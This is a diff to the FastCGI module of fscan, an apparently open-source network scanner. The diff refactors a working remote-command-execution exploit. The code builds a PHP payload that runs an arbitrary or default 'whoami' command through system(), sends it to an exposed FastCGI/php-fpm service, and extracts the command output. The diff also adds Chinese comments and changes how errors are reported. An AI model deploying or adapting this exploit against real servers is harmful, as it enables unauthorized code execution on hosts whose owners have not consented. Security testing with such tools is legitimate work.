@@ -6,6 +6,7 @@ import (
 	"encoding/binary"
 	"errors"
 	"fmt"
+	"github.com/shadow1ng/fscan/Config"
 	"github.com/shadow1ng/fscan/common"
 	"io"
 	"strconv"
@@ -18,34 +19,43 @@ import (
 //https://xz.aliyun.com/t/9544
 //https://github.com/wofeiwo/webcgi-exploits
 
-func FcgiScan(info *common.HostInfo) {
+// FcgiScan 执行FastCGI服务器漏洞扫描
+func FcgiScan(info *Config.HostInfo) error {
+	// 如果设置了暴力破解模式则跳过
 	if common.IsBrute {
-		return
+		return nil
 	}
+
+	// 设置目标URL路径
 	url := "/etc/issue"
 	if common.Path != "" {
 		url = common.Path
 	}
 	addr := fmt.Sprintf("%v:%v", info.Host, info.Ports)
+
+	// 构造PHP命令注入代码
 	var reqParams string
-	var cutLine = "-----ASDGTasdkk361363s-----\n"
+	var cutLine = "-----ASDGTasdkk361363s-----\n" // 用于分割命令输出的标记
+
 	switch {
 	case common.Command == "read":
-		reqParams = ""
+		reqParams = "" // 读取模式
 	case common.Command != "":
-		reqParams = "<?php system('" + common.Command + "');die('" + cutLine + "');?>"
+		reqParams = fmt.Sprintf("<?php system('%s');die('%s');?>", common.Command, cutLine) // 自定义命令
 	default:
-		reqParams = "<?php system('whoami');die('" + cutLine + "');?>"
+		reqParams = fmt.Sprintf("<?php system('whoami');die('%s');?>", cutLine) // 默认执行whoami
 	}
 
-	env := make(map[string]string)
+	// 设置FastCGI环境变量
+	env := map[string]string{
+		"SCRIPT_FILENAME": url,
+		"DOCUMENT_ROOT":   "/",
+		"SERVER_SOFTWARE": "go / fcgiclient ",
+		"REMOTE_ADDR":     "127.0.0.1",
+		"SERVER_PROTOCOL": "HTTP/1.1",
+	}
 
-	env["SCRIPT_FILENAME"] = url
-	env["DOCUMENT_ROOT"] = "/"
-	env["SERVER_SOFTWARE"] = "go / fcgiclient "
-	env["REMOTE_ADDR"] = "127.0.0.1"
-	env["SERVER_PROTOCOL"] = "HTTP/1.1"
-
+	// 根据请求类型设置对应的环境变量
 	if len(reqParams) != 0 {
 		env["CONTENT_LENGTH"] = strconv.Itoa(len(reqParams))
 		env["REQUEST_METHOD"] = "POST"
@@ -54,6 +64,7 @@ func FcgiScan(info *common.HostInfo) {
 		env["REQUEST_METHOD"] = "GET"
 	}
 
+	// 建立FastCGI连接
 	fcgi, err := New(addr, common.Timeout)
 	defer func() {
 		if fcgi.rwc != nil {
@@ -61,54 +72,47 @@ func FcgiScan(info *common.HostInfo) {
 		}
 	}()
 	if err != nil {
-		errlog := fmt.Sprintf("[-] fcgi %v:%v %v", info.Host, info.Ports, err)
-		common.LogError(errlog)
-		return
+		fmt.Printf("[!] FastCGI连接失败 %v:%v - %v\n", info.Host, info.Ports, err)
+		return err
 	}
 
+	// 发送FastCGI请求
 	stdout, stderr, err := fcgi.Request(env, reqParams)
 	if err != nil {
-		errlog := fmt.Sprintf("[-] fcgi %v:%v %v", info.Host, info.Ports, err)
-		common.LogError(errlog)
-		return
+		fmt.Printf("[!] FastCGI请求失败 %v:%v - %v\n", info.Host, info.Ports, err)
+		return err
 	}
 
-	//1
-	//Content-type: text/html
-	//
-	//uid=1001(www) gid=1001(www) groups=1001(www)
-
-	//2
-	//Status: 404 Not Found
-	//Content-type: text/html
-	//
-	//File not found.
-	//Primary script unknown
-
-	//3
-	//Status: 403 Forbidden
-	//Content-type: text/html
-	//
-	//Access denied.
-	//Access to the script '/etc/passwd' has been denied (see security.limit_extensions)
+	// 处理响应结果
+	output := string(stdout)
 	var result string
-	var output = string(stdout)
-	if strings.Contains(output, cutLine) { //命令成功回显
+
+	if strings.Contains(output, cutLine) {
+		// 命令执行成功，提取输出结果
 		output = strings.SplitN(output, cutLine, 2)[0]
 		if len(stderr) > 0 {
-			result = fmt.Sprintf("[+] FCGI %v:%v \n%vstderr:%v\nplesa try other path,as -path /www/wwwroot/index.php", info.Host, info.Ports, output, string(stderr))
+			result = fmt.Sprintf("[+] FastCGI漏洞确认 %v:%v\n命令输出:\n%v\n错误信息:\n%v\n建议尝试其他路径，例如: -path /www/wwwroot/index.php",
+				info.Host, info.Ports, output, string(stderr))
 		} else {
-			result = fmt.Sprintf("[+] FCGI %v:%v \n%v", info.Host, info.Ports, output)
+			result = fmt.Sprintf("[+] FastCGI漏洞确认 %v:%v\n命令输出:\n%v",
+				info.Host, info.Ports, output)
 		}
 		common.LogSuccess(result)
-	} else if strings.Contains(output, "File not found") || strings.Contains(output, "Content-type") || strings.Contains(output, "Status") {
+	} else if strings.Contains(output, "File not found") ||
+		strings.Contains(output, "Content-type") ||
+		strings.Contains(output, "Status") {
+		// 目标存在FastCGI服务但可能路径错误
 		if len(stderr) > 0 {
-			result = fmt.Sprintf("[+] FCGI %v:%v \n%vstderr:%v\nplesa try other path,as -path /www/wwwroot/index.php", info.Host, info.Ports, output, string(stderr))
+			result = fmt.Sprintf("[*] FastCGI服务确认 %v:%v\n响应:\n%v\n错误信息:\n%v\n建议尝试其他路径，例如: -path /www/wwwroot/index.php",
+				info.Host, info.Ports, output, string(stderr))
 		} else {
-			result = fmt.Sprintf("[+] FCGI %v:%v \n%v", info.Host, info.Ports, output)
+			result = fmt.Sprintf("[*] FastCGI服务确认 %v:%v\n响应:\n%v",
+				info.Host, info.Ports, output)
 		}
 		common.LogSuccess(result)
 	}
+
+	return nil
 }
 
 // for padding so we don't have to allocate all the time
